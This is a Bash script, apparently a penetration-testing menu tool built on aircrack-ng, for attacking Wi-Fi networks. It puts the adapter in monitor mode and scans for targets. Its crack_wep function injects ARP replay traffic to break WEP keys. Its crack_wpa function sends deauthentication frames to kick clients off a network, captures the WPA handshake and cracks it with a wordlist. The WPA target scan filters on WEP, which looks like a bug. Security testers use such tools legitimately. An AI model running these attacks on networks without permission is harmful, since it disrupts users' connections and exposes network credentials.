#!/usr/bin/env bash

# by Lee Baird @discoverscripts

trap cleanup EXIT

# Global Variables
INTERFACE=""
MONITOR=""
PID_AIREPLAY=""
PID_AIRODUMP=""
SCANFILE="$HOME/wtf-data/scan"
WORKDIR="$HOME/wtf-data"

BLUE='\033[1;34m'
GREEN='\033[0;32m'
RED='\033[1;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

banner(){
    echo
    echo -e "${YELLOW}
__          __  _________   _________
\ \        / / |___   ___| |  _______|
 \ \  /\  / /      | |     | |____
  \ \/  \/ /       | |     |  ____|
   \  /\  /        | |     | |
    \/  \/         |_|     |_|

        Wireless Testing Framework

              By Lee Baird${NC}"
    echo
    echo
}

dependencies() {
    # Initialize an array to hold missing tools
    missing_tools=()

    # Check for tools
    for tool in aircrack-ng aireplay-ng airmon-ng airodump-ng xterm; do
        if ! command -v "$tool" &> /dev/null; then
            missing_tools+=("$tool")
        fi
    done

    # Display missing tools
    if [ ${#missing_tools[@]} -ne 0 ]; then
        echo
        echo -e "${RED}[!] Missing tools: ${missing_tools[*]}${NC}"
        echo
        exit 1
    fi

    echo -e "${BLUE}[*] Required tools installed.${NC}"

    # Check for wireless interface
    INTERFACE=$(iw dev | awk '$1=="Interface"{print $2}' || true)

    if [ -z "$INTERFACE" ]; then
        echo
        echo -e "${RED}[!] No wireless device found.${NC}"
        echo
        echo "Check if your wireless adapter is connected or enabled."
        echo
        exit 1
    fi
}

start_monitor_mode() {
    # Check for wireless interface
    INTERFACE=$(iw dev | awk '$1=="Interface"{print $2}' || true)

    if [ -z "$INTERFACE" ]; then
        echo
        echo -e "${RED}[!] No wireless device found.${NC}"
        echo
        echo "Check if your wireless adapter is connected or enabled."
        echo
        exit 1
    fi

    # Kill interfering processes (NetworkManager, wpa_supplicant)
    airmon-ng check kill

    echo -e "${BLUE}[*] Enabling monitor mode.${NC}"

    # Enable monitor mode on the interface
    airmon-ng start "$INTERFACE" | sed '/^$/d'

    # Wait to ensure the interface switches to monitor mode
    sleep 2

    # Check if the interface is in monitor
    MODE=$(iwconfig "$INTERFACE" 2>/dev/null | grep "Mode:Monitor")

    if [ -z "$MODE" ]; then
        echo
        echo -e "${RED}[!] Failed to enable monitor mode on interface: $INTERFACE.${NC}"
        echo
        exit 1
    else
        MONITOR="$INTERFACE"  # Keep using the same interface name
        echo -e "${BLUE}[*] Monitor mode enabled on interface:${NC} ${GREEN}$MONITOR${NC}"
    fi

    echo
    echo -e "${YELLOW}Press <Enter> to continue.${NC}"
    read -r
    banner; main_menu
}

if [ ! -d "$WORKDIR" ]; then
    mkdir -p "$WORKDIR"
fi

scan_networks() {
    echo
    echo -e "${BLUE}[*] Scanning for wireless networks.${NC}"
    echo -e "${BLUE}[*] Using monitor interface:${NC} ${GREEN}$MONITOR${NC}"

    airodump-ng "$MONITOR" --output-format csv -w "$SCANFILE" &> "$WORKDIR/airodump.log" &
    PID_AIRODUMP=$!

    # Increase the sleep time to capture more data
    sleep 10

    # Check if the process is still running before trying to kill it
    if kill -0 "$PID_AIRODUMP" &>/dev/null; then
        kill "$PID_AIRODUMP"
    else
        echo -e "${RED}[!] airodump-ng process is not running.${NC}"
    fi

    # Check if the scan file exists
    if [ -f "${SCANFILE}-01.csv" ]; then
        echo
        echo -e "${BLUE}[*] Scan complete. Data saved to ${SCANFILE}-01.csv.${NC}"
        echo
        echo -e "${YELLOW}[*] Displaying results:${NC}"
        awk -F, 'NR > 2 && $1 ~ /[0-9a-fA-F:]/ {print "BSSID: " $1, " | Channel: " $4, " | Encryption: " $6, " | ESSID: " $14}' "${SCANFILE}-01.csv" | column -t
    else
        echo
        echo -e "${RED}[!] No wireless networks found or failed to write data.${NC}"
        echo
        echo -e "${YELLOW}Check $WORKDIR/airodump.log for errors.${NC}"
    fi
    
    echo
    echo -e "${YELLOW}Press <Enter> to continue.${NC}"
    read -r
    banner; main_menu
}

crack_wep() {
    echo
    echo -e "${BLUE}[*] Running airodump-ng to find WEP targets.${NC}"
    airodump-ng --encrypt WEP "$MONITOR"
    echo
    echo -n "BSSID: "
    read -r BSSID
    echo -n "Channel: "
    read -r CHANNEL
    echo -n "Client MAC address: "
    read -r CLIENT

    if [ -z "$BSSID" ] || [ -z "$CHANNEL" ]; then
        echo
        echo -e "${RED}[!] Missing data.${NC}"
        cleanup
    fi

    if [ -z "$CLIENT" ]; then
        CLIENT="ff:ff:ff:ff:ff:ff"
    fi

    xterm -e "airodump-ng $MONITOR --bssid $BSSID --channel $CHANNEL --write wep_capture" &
    PID_AIRODUMP=$!
    sleep 5
    xterm -e "aireplay-ng $MONITOR --arpreplay -b $BSSID -h $CLIENT" &
    PID_AIREPLAY=$!

    echo
    echo -e "${BLUE}[*] Gathering data for WEP cracking.${NC}"
    sleep 60  # Capture data
    
    if aircrack-ng -b "$BSSID" wep_capture*.cap; then
        echo
        echo -e "${YELLOW}[*] WEP cracked successfully.${NC}"
    else
        echo
        echo -e "${RED}[!] WEP cracking failed.${NC}"
        echo
        exit 1
    fi
}

crack_wpa() {
    echo
    echo -e "${BLUE}[*] Running airodump-ng to find WPA targets.${NC}"
    airodump-ng --encrypt WEP "$MONITOR"
    echo
    echo -n "BSSID: "
    read -r BSSID
    echo -n "Channel: "
    read -r CHANNEL
    echo -n "Client MAC address: "
    read -r CLIENT

    if [ -z "$BSSID" ] || [ -z "$CHANNEL" ]; then
        echo
        echo -e "${RED}[!] Missing data.${NC}"
        cleanup
    fi

    xterm -e "airodump-ng $MONITOR --bssid $BSSID --channel $CHANNEL --write wpa_capture" &
    PID_AIRODUMP=$!
    sleep 5
    xterm -e "aireplay-ng $MONITOR --deauth 10 -a $BSSID" &
    PID_AIREPLAY=$!

    echo
    echo -e "${BLUE}[*] Capturing handshake for WPA cracking.${NC}"
    sleep 60  # Capture handshake

    if ! aircrack-ng wpa_capture*.cap | grep -q "WPA handshake"; then
        echo
        echo -e "${RED}[!] No WPA handshake found.${NC}"
        cleanup
    fi

    echo
    echo -n "Enter the path to your wordlist: "
    read -r WORDLIST

    if [ -z "$WORDLIST" ]; then
        echo
        echo -e "${RED}[!] No data entered.${NC}"
        echo
        exit 1
    fi

    if [ ! -f "$WORDLIST" ]; then
        echo
        echo -e "${RED}[!] The file does not exist.${NC}"
        echo
        exit 1
    fi

    if aircrack-ng -w "$WORDLIST" wpa_capture*.cap; then
        echo
        echo -e "${YELLOW}[*] WPA cracked successfully.${NC}"
        cleanup
    else
        echo
        echo -e "${RED}[!] WPA cracking failed.${NC}"
        echo
        exit 1
    fi
}

cleanup() {
    # Reset PIDs after killing them
    if [ -n "${PID_AIRODUMP:-}" ]; then
        kill "$PID_AIRODUMP" &>/dev/null || true
        PID_AIRODUMP=""
    fi

    if [ -n "${PID_AIREPLAY:-}" ]; then
        kill "$PID_AIREPLAY" &>/dev/null || true
        PID_AIREPLAY=""
    fi

    # Reset wireless interface
    airmon-ng stop "$INTERFACE" &>/dev/null

    echo
    echo
    echo -e "${BLUE}[*] Cleanup complete.${NC}"
    echo
    exit
}

main_menu() {
    echo -e "${BLUE}[*] Wireless interface:${NC} ${GREEN}$INTERFACE${NC}"

    while true; do
        echo
        echo "1. Enable monitor mode"
        echo "2. Scan for networks"
        echo "3. Crack WEP"
        echo "4. Crack WPA"
        echo "5. Exit"
        echo
        echo -n "Choice: "
        read -r CHOICE

        case "$CHOICE" in
            1) start_monitor_mode ;;
            2) scan_networks ;;
            3) crack_wep ;;
            4) crack_wpa ;;
            5) cleanup ;;
            *) echo; echo -e "${RED}[!] Invalid option, try again.${NC}"; echo; sleep 2;
               banner; main_menu ;;
        esac
    done
}

# Run the script
banner
dependencies
main_menu
